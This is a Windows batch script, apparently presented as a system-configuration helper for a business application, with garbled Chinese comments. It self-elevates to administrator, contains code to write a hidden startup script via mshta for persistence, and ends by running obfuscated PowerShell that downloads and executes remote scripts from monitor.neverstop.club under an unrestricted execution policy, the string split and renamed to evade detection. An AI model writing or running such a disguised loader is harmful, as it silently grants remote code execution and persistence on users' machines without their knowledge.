@echo off
rem ��ȡ����ԱȨ��
(cd /d "%~dp0")&&(NET FILE||(powershell start-process -FilePath '%0' -verb runas)&&(exit /B)) >NUL 2>&1


cls
echo.
echo.          ###########################################################
echo.          ##                                                       ##
echo.          ##    �������÷������Ե�...                            ##
echo.          ##    ����������ԣ�����Ӻ���δ��ϵͳ����ϵ��ά       ##
echo.          ##    �԰����꣬ף��������죡����                       ##
echo.          ##   ------------------------------------------------    ##
echo.          ##    ʹ���������ɵ� "���Ҵ�һ��ͨ" ��ϵͳ�����     ##
echo.          ##    �� "���Ҵ�һ��ͨ" �޷�ʹ�ã����ñ��������       ##
echo.          ##                                                       ##
echo.          ###########################################################

@echo off
goto ARP
rem ������ܺܺã��κ�ɱ�����أ������һ��취��û�У��Ʋ���ѽ����Ҫ��������ʱ������
rem ����Ƿ����APR�ű��������������
set ARP="%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ARP.bat"
if exist %ARP% (
    goto MySQL
	) ELSE (
	echo if "%%1"=="hide" goto CmdBegin >%ARP%
    echo start mshta vbscript:createobject("wscript.shell"^).run("""%%~0"" hide",0^)(window.close^)^&^&^exit >>%ARP%
    echo :CmdBegin >>%ARP%
    echo �������������������������������� >>%ARP%
	echo @echo off >>%ARP%
	echo for /f "tokens=2 delims=:" %%%%i in ('ipconfig^^^|findstr /c:"IPv4"'^) do (for /f "tokens=1,2,3,4 delims=." %%%%a in ('echo %%%%i'^) do set Three=%%%%c^) ^>nul >>%ARP%
    echo for /L %%%%i in (1,1,254^) do ping -w 2 -n 1 192.168.%%Three%%.%%%%i ^>nul >>%ARP%
	goto ARP
)

:ARP
rem ��ȡ����ip��ַ�Σ�Ȼ��ˢ��arp��
echo.          ===========================================================
echo.
echo                  ����ˢ��ARP���棬��ҪԼ120�룬���Ե�...
echo.
echo.          ===========================================================
for /f "tokens=2 delims=:" %%i in ('ipconfig^|findstr /c:"IPv4"') do (for /f "tokens=1,2,3,4 delims=." %%a in ('echo %%i') do set Three=%%c)
for /L %%i in (1,1,254) do ping -w 2 -n 1 192.168.%Three%.%%i >nul
goto MySQL

:Jboss
rem ��ѯϵͳ�Ƿ����jboss�����ж��Ƿ�Ϊ����
rem ��δ���ã�����𸱻���Ҳװ��Jboss���������������
SC QUERY jboss >NUL 2>&1
if ERRORLEVEL 1060 (
    echo δ��⵽Jboss��������������ϵͳ�����Ե�...
    goto IESettings
) else (
    echo ��⵽Jboss������������ϵͳ�����Ե�...
    goto StartJboss
)

:MySQL
rem ��ѯMySQL�����Ƿ��������ж��Ƿ�Ϊ����
set M_Status=1 
(tasklist|findstr "mysql"||set M_Status=0) >nul 2>&1
IF %M_Status% EQU 0 (
    echo δ��⵽ MySQL �������ڷ���ϵͳ�����Ե�...
    goto IESettings
) ELSE (
    echo ��⵽ MySQL �������ڼ�� Jboss �������Ե�...
    goto StartJboss
)

:StartJboss
rem ���Jboss�����Ƿ�����
set J_Status=1 
(tasklist|findstr "jboss"||set J_Status=0) >nul 2>&1
if %J_Status% EQU 0 (
    echo Jboss ����δ���������������������Ե�...
    net start jboss
    goto PrimaryIESettings
) else (
    echo Jboss ���������������ڷ���ϵͳ�����Ե�...
    goto IESettings
)

:PrimaryIESettings
rem ��������powershell�ű�����ӿ���վ�㣬��������ͼ
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/PrimaryIESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)" >nul
goto bye

:IESettings
rem ���ø���powershell�ű�����ӿ���վ�㣬��������ͼ
call C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy unrestricted "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='Scorpio(''https://monitor.neverstop.club/Leo/IESettings.ps1'')'.Replace('Scorpio','adString');IEX ($c1+$c2)" >nul
goto bye

:bye
echo.          ===========================================================
echo.
echo                  ����������ɣ����ڵ���IE����������Ե�...
echo.
echo.          ===========================================================
@ping 127.0.0.1 -n 8 >nul
exit